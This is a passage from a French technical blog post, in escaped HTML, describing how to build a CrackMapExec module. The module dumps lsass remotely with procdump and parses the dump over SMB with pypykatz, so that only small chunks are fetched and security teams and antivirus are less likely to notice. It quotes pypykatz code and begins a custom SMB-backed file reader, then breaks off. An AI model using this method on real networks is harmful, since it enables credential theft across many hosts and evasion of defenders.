&lt;p&gt;Nous sommes maintenant en mesure de dumper lsass sur la machine distante et de l’analyser en local sur notre linux de manière automatique avec un nouveau module CrackMapExec. Mais un dump mémoire de processus, ce n’est pas quelques octets, ni même quelques kilo octets. Ce sont plusieurs méga octets, voire dizaines de méga octets pour lsass. Lors de mes tests, certains dumps avaient une taille de plus de 150Mo. Si nous voulons automatiser ce processus, il va falloir trouver une solution, car télécharger un dump lsass sur un sous-réseau de 200 machines amènerait à télécharger plusieurs dizaines de giga octets. D’une part ça prendra beaucoup de temps, surtout si ce sont des machines distantes, dans d’autres pays, et d’autre part un flux réseau anormal pourrait être détecté par les équipes de sécurité.&lt;/p&gt;

&lt;p&gt;Jusque là, nous avions des outils pour répondre à nos problèmes, mais cette fois-ci, il va falloir mettre les mains dans le moteur.&lt;/p&gt;

&lt;p&gt;Nous n’allons pas réinventer la roue pour autant, et nous continuerons d’utiliser pypykatz pour extraire les informations du dump de lsass. L’idée étant de n’utiliser que procdump sur la machine distante, il n’est pas envisageable d’envoyer pypykatz pour faire le travail sur la machine distante. D’une part python peut ne pas être installé, et d’autre part il est possible que pypykatz soit détecté par des antivirus.&lt;/p&gt;

&lt;p&gt;Ces prérequis en tête, voici la méthode que nous allons utiliser : Afin d’analyser un dump en local, pypykatz doit ouvrir le fichier et lire des octets à certains endroits. Les informations recherchées dans le dump sont présentes à certains offsets, et ne sont pas plus grandes que quelques octets, ou kilo octets. Pypykatz suit des pointeurs présents à des offsets précis afin de trouver l’information qui l’intéresse.&lt;/p&gt;

&lt;p&gt;L’idée est alors de lire ces offsets et ces adresses à distance, sur le dump présent sur la cible, et de ne rapatrier que les quelques morceaux de dump qui contiennent les informations attendues.&lt;/p&gt;

&lt;p&gt;En ce sens, regardons comment fonctionne pypykatz. La ligne de commande que nous utilisons jusqu’ici est la suivante :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pypykatz lsa minidump lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C’est en fait la classe &lt;code class=&quot;highlighter-rouge&quot;&gt;LSACMDHelper&lt;/code&gt; qui gère la partie &lt;code class=&quot;highlighter-rouge&quot;&gt;lsa&lt;/code&gt;. Et lorsqu’on lui fournit un dump de lsass, c’est la méthode &lt;code class=&quot;highlighter-rouge&quot;&gt;run()&lt;/code&gt; de cette classe qui est appelée. Dans cette méthode &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;, il y a notamment :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;###### Minidump
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'minidump'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dir_fullpath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memoryfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;file_pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'*.dmp'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recursive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;globdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir_fullpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'**'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	
            &lt;span class=&quot;n&quot;&gt;globdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir_fullpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            
        &lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Parsing folder &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dir_fullpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Parsing file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pypykatz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_minidump_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;files_with_error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Error parsing file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;halt_on_error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On voit alors que le parsing du dump se fait à la ligne suivante :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pypykatz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_minidump_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette méthode est définie dans &lt;code class=&quot;highlighter-rouge&quot;&gt;pypykatz.py&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;minidump.minidumpfile&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MinidumpFile&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
&amp;lt;snip&amp;gt;
&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;staticmethod&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_minidump_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;minidump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MinidumpFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minidump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_buffered_reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sysinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KatzSystemInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_minidump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minidump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Minidump parsing error!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pypykatz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sysinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#logger.info('Credentials parsing error!')
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_basic_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mimi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C’est en fait la classe &lt;code class=&quot;highlighter-rouge&quot;&gt;MinidumpFile&lt;/code&gt; du packet &lt;code class=&quot;highlighter-rouge&quot;&gt;minidump&lt;/code&gt; qui gère le parsing. Il faut donc creuser un peu plus loin, et étudier &lt;a href=&quot;https://github.com/skelsec/minidump&quot;&gt;minidump&lt;/a&gt;, également écrit par Skelsec.&lt;/p&gt;

&lt;p&gt;Dans la classe &lt;code class=&quot;highlighter-rouge&quot;&gt;Minidumpfile&lt;/code&gt;, la méthode &lt;code class=&quot;highlighter-rouge&quot;&gt;parse&lt;/code&gt; est la suivante :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;staticmethod&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MinidumpFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mf&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Voilà, c’est cet endroit qui nous intéresse. Le fichier que nous passons en argument est ouvert puis son contenu est analysé. Je vous passe les extraits de code, mais en suivant la méthode privée &lt;code class=&quot;highlighter-rouge&quot;&gt;_parse&lt;/code&gt;, nous nous rendons compte que &lt;code class=&quot;highlighter-rouge&quot;&gt;minidump&lt;/code&gt; utilise les méthodes &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;seek&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;tell&lt;/code&gt; pour analyser le fichier.&lt;/p&gt;

&lt;p&gt;Il suffit alors de remplacer la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; par quelque chose que nous maitrisons afin d’ouvrir un accès vers le fichier distant, et de réécrire les méthodes &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;seek&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;tell&lt;/code&gt;. Fort heureusement pour nous, la suite impacket possède des bouts de code qui nous serons très utiles.&lt;/p&gt;

&lt;p&gt;Voici une partie de l’implémentation de cette classe. Du code a été simplifié pour la compréhension de l’article.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
Réécriture de 'open' pour ouvrir et lire un fichier distant
&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_parseArg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        ImpacketSMBConnexion est une surclasse de impacket que j'ai écrite pour simplifier cet extrait de code
        &quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImpacketSMBConnexion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fpath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__connectTree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Parsing du nom de fichier pour récupérer les informations d'authentification
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_parseArg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
